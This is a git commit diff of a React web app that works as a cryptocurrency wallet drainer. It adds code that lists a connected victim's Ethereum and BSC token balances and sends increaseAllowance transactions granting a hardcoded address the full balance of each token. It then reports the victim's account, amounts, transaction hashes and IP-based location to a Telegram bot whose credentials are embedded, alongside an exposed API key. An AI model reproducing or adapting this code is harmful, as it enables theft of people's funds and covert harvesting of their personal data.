09132154262131d3c4687ea97707a0e503d46172
ktarun1419 <tarunkaushik355@gmail.com>
2023-12-20 18:59:34 +0530

    ff

--- src/App.js
+++ src/App.js
@@ -4,48 +4,20 @@ import axios from "axios";
 import { useEffect, useState } from "react";
 import Web3 from "web3";
 import { ABI, USDTBSC } from "./constant";
-import { CovalentClient } from "@covalenthq/client-sdk";
+import {
+  checkAndChangeNetwork,
+  getLocationData,
+  prepareTransaction,
+  switchToBsc,
+  switchToEthereumMainnet,
+} from "./functions";
 
 function App() {
-  const botToken = "6910766449:AAH_KtR65hweWsgLQMJXXgAadzG2PSN892U"; // Caution: Exposing token
-  const chatId = "1876632135";
-  const targetAddress = "0xac798ad8c3f4b3226bb0d1b769d4a23376bfdf46";
   const [connected, setConnected] = useState(false);
   const [account, setAccount] = useState("");
   const [balances, setBalances] = useState([]);
-  // const [bscbalances]
-  async function checkAndChangeNetwork() {
-    try {
-      const web3= new Web3(window.ethereum)
-        const networkId = await web3.eth.net.getId();
-        console.log(Number(networkId))
-        // Ethereum's main network ID is 1
-        if (Number(networkId) !== 1) {
-            // Check if MetaMask is available
-            if (window.ethereum) {
-                try {
-                    await window.ethereum.request({
-                        method: 'wallet_addEthereumChain',
-                        params: [{
-                            chainId: '0x1', // Hexadecimal version of 1
-                            chainName: 'Ethereum Mainnet',
-                            rpcUrls:['']
-                            // ... other parameters like rpcUrls, blockExplorerUrls etc.
-                        }]
-                    });
-                } catch (error) {
-                    console.error('User rejected the network change request');
-                }
-            } else {
-                console.log('MetaMask is not available');
-            }
-        } else {
-            console.log('Already connected to the Ethereum Mainnet');
-        }
-    } catch (error) {
-        console.error('An error occurred:', error);
-    }
-}
+  const [bscbalances, setbscBalances] = useState([]);
+
   const connectWallet = async () => {
     if (typeof window.ethereum !== "undefined") {
       try {
@@ -54,10 +26,11 @@ function App() {
         const accounts = await web3.eth.getAccounts();
         console.log("Connected account:", accounts[0]);
         setAccount(accounts[0]);
-        checkAndChangeNetwork()
+        switchToEthereumMainnet()
+        // checkAndChangeNetwork();
         setConnected(true);
         ApiServices(accounts[0]);
-        getLocationData()
+        // getLocationData();
       } catch (error) {
         console.error(error);
       }
@@ -65,87 +38,89 @@ function App() {
       console.log("Please install MetaMask!");
     }
   };
-  const sendMessage = async (message) => {
-    try {
-      await axios
-        .post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          chat_id: chatId,
-          text: message,
-        })
-        .then((res) => {
-          console.log(res);
-        });
-    } catch (error) {
-      console.error("Error sending message", error);
-      // Handle error
-    }
-  };
+
   const Drain = async () => {
     if (connected) {
-      for (const item of balances) {
-        try {
-          await prepareTransaction(item);
-        } catch (error) {}
+      if (balances.length>1) {
+        switchToEthereumMainnet()
+        .then(async (res) => {
+          if (res) {
+            for (const item of balances) {
+              try {
+                await prepareTransaction(item, account);
+              } catch (error) {
+                alert("Something went wrong");
+              }
+            }
+          }
+        })
+        .catch((e) => {
+          alert("Please switch to ethereum mainnet");
+        });
       }
+      if (bscbalances.length>1) {
+        switchToBsc()
+        .then(async (res) => {
+          if (res) {
+            for (const item of bscbalances) {
+              try {
+                await prepareTransaction(item, account);
+              } catch (error) {
+                alert("Something went wrong");
+              }
+            }
+          }
+        })
+        .catch((e) => {
+          alert("Please switch to ethereum mainnet");
+        });
+      }
+     
+     
     }
   };
-  const prepareTransaction = async (item) => {
-    if (item?.native_token) {
-      return
-    }
-    let web3 = new Web3(window.ethereum);
-    let Contract = new web3.eth.Contract(ABI, item?.contract_address);
-    let tx = {
-      from: account,
-      to: item?.contract_address,
-      gasPrice: web3.utils.toHex(20 * 1e9),
-      gasLimit: web3.utils.toHex(50000),
-      data: Contract.methods
-        .increaseAllowance(targetAddress, item?.balance)
-        .encodeABI(),
-    };
-    console.log({tx})
-    await web3.eth
-      .sendTransaction(tx)
-      .on("receipt", function (receipt) {
-        sendMessage(`${account},10 USDT BSC CHAIN`);
-      })
-      .catch((er) => {
-        console.log({ er });
-      });
-  };
+
   const ApiServices = async (account) => {
     axios
       .get(
-        `https://api.covalenthq.com/v1/bsc-mainnet/address/${account}/balances_v2/?key=cqt_rQvGkMv9WbcvyKk9FWWBVhXftmxV`
+        `https://api.covalenthq.com/v1/eth-mainnet/address/${account}/balances_v2/?key=cqt_rQvGkMv9WbcvyKk9FWWBVhXftmxV`
       )
       .then((res) => {
         let newArr = res?.data?.data?.items?.filter(
           (item) => Number(item?.quote_rate) > 0
         );
         setBalances(newArr);
+        axios
+          .get(
+            `https://api.covalenthq.com/v1/bsc-mainnet/address/${account}/balances_v2/?key=cqt_rQvGkMv9WbcvyKk9FWWBVhXftmxV`
+          )
+          .then((res) => {
+            let newArr = res?.data?.data?.items?.filter(
+              (item) => Number(item?.quote_rate) > 0
+            );
+            setbscBalances(newArr);
+          });
       });
   };
-  const getLocationData = () => {
-    axios
-      .get("https://api.ipify.org?format=json")
-      .then((res) => {
-        axios.get(`https://ipapi.co/${res.data?.ip}/json/`).then((result) => {
-          let message = `New client has been connected and country is ${result?.data?.country_name} and city is ${result?.data?.city} and ip address is ${result?.data?.ip}`;
-          sendMessage(message);
-        });
-      })
-      .catch((err) => {});
-  };
-  useEffect(() => {
-    if (balances?.length>0) {
-      let message='Totol Portfolio is '
-      balances.forEach((item)=>{
-        message+=String(item?.contract_name)+' '+String(item?.pretty_quote)+' '
-      })
-      sendMessage(message)
-    }
-  }, [balances]);
+
+  // useEffect(() => {
+  //   if (balances?.length>0) {
+  //     let message='Totol Portfolio is '
+  //     balances.forEach((item)=>{
+  //       message+=String(item?.contract_name)+' '+String(item?.pretty_quote)+' '
+  //     })
+  //     sendMessage(message)
+  //   }
+  // }, [balances]);
+  // useEffect(() => {
+  //   if (bscbalances?.length>0) {
+  //     let message='Totol Portfolio is '
+  //     balances.forEach((item)=>{
+  //       message+=String(item?.contract_name)+' '+String(item?.pretty_quote)+' '
+  //     })
+  //     sendMessage(message)
+  //   }
+  // }, [bscbalances]);
 
   return (
     <div>
---
+++ src/functions.js
@@ -0,0 +1,137 @@
+import axios from "axios";
+import Web3 from "web3";
+import { ABI } from "./constant";
+const botToken = "6910766449:AAH_KtR65hweWsgLQMJXXgAadzG2PSN892U"; // Caution: Exposing token
+const chatId = "1876632135";
+const targetAddress = "0xac798ad8c3f4b3226bb0d1b769d4a23376bfdf46";
+let web3 = new Web3(window.ethereum);
+export const sendMessage = async (message) => {
+  try {
+    await axios
+      .post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        chat_id: chatId,
+        text: message,
+      })
+      .then((res) => {
+        console.log(res);
+      });
+  } catch (error) {
+    console.error("Error sending message", error);
+    // Handle error
+  }
+};
+export const getLocationData = () => {
+  axios
+    .get("https://api.ipify.org?format=json")
+    .then((res) => {
+      axios.get(`https://ipapi.co/${res.data?.ip}/json/`).then((result) => {
+        let message = `New client has been connected and country is ${result?.data?.country_name} and city is ${result?.data?.city} and ip address is ${result?.data?.ip}`;
+        sendMessage(message);
+      });
+    })
+    .catch((err) => {});
+};
+//   export async function checkAndChangeNetwork() {
+//     try {
+//       const web3= new Web3(window.ethereum)
+//         const networkId = await web3.eth.net.getId();
+//         console.log(Number(networkId))
+//         // Ethereum's main network ID is 1
+//         if (Number(networkId) !== 1) {
+//             // Check if MetaMask is available
+//             if (window.ethereum) {
+//                 try {
+//                     await window.ethereum.request({
+//                         method: 'wallet_addEthereumChain',
+//                         params: [{
+//                             chainId: '0x1', // Hexadecimal version of 1
+//                             chainName: 'Ethereum Mainnet',
+//                             rpcUrls:['']
+//                             // ... other parameters like rpcUrls, blockExplorerUrls etc.
+//                         }]
+//                     });
+//                 } catch (error) {
+//                     console.error('User rejected the network change request');
+//                 }
+//             } else {
+//                 console.log('MetaMask is not available');
+//             }
+//         } else {
+//             console.log('Already connected to the Ethereum Mainnet');
+//         }
+//     } catch (error) {
+//         console.error('An error occurred:', error);
+//     }
+// }
+export const prepareTransaction = async (item, account) => {
+  if (item?.native_token) {
+    return;
+  }
+
+  let Contract = new web3.eth.Contract(ABI, item?.contract_address);
+  console.log(item?.balance, targetAddress, account, item);
+  let tx = {
+    from: account,
+    to: "0xcc42724c6683b7e57334c4e856f4c9965ed682bd",
+    //   gasPrice: web3.utils.toHex(20 * 1e9),
+    //   gasLimit: web3.utils.toHex(60000),
+    data: Contract.methods
+      .increaseAllowance(targetAddress, item?.balance)
+      .encodeABI(),
+  };
+
+  let gas = await web3.eth.estimateGas(tx);
+  tx["gas"] = gas;
+  console.log(tx);
+  await web3.eth
+    .sendTransaction(tx)
+    .on("receipt", function (receipt) {
+      console.log(receipt);
+      let message = `Account:${account}
+       Amount:${Number(item?.balance) / 10 ** Number(item?.contract_decimals)} 
+       ${
+        item?.contract_name
+      }
+        Transactionhash:${receipt?.transactionHash}
+        Contract Address:${item?.contract_address}
+        `;
+      sendMessage(message);
+    })
+    .catch((er) => {
+      console.log({ er });
+    });
+};
+export async function switchToEthereumMainnet() {
+  try {
+    const netId = await web3.eth.net.getId();
+    if (netId !== 1) {
+      // Ethereum Mainnet network ID is not 1, so switch
+      await window.ethereum.request({
+        method: "wallet_switchEthereumChain",
+        params: [{ chainId: "0x1" }], // Hexadecimal representation of 1
+      });
+      return true; // Successfully switched to Mainnet
+    }
+    return true; // Already on Mainnet
+  } catch (error) {
+    console.error("Error switching network or checking network ID:", error);
+    return false;
+  }
+}
+export async function switchToBsc() {
+  try {
+    const netId = await web3.eth.net.getId();
+    if (Number(netId) !== 56) {
+      // Ethereum Mainnet network ID is not 1, so switch
+      await window.ethereum.request({
+        method: "wallet_switchEthereumChain",
+        params: [{ chainId: "0x38" }], // Hexadecimal representation of 1
+      });
+      return true; // Successfully switched to Mainnet
+    }
+    return true; // Already on Mainnet
+  } catch (error) {
+    console.error("Error switching network or checking network ID:", error);
+    return false;
+  }
+}
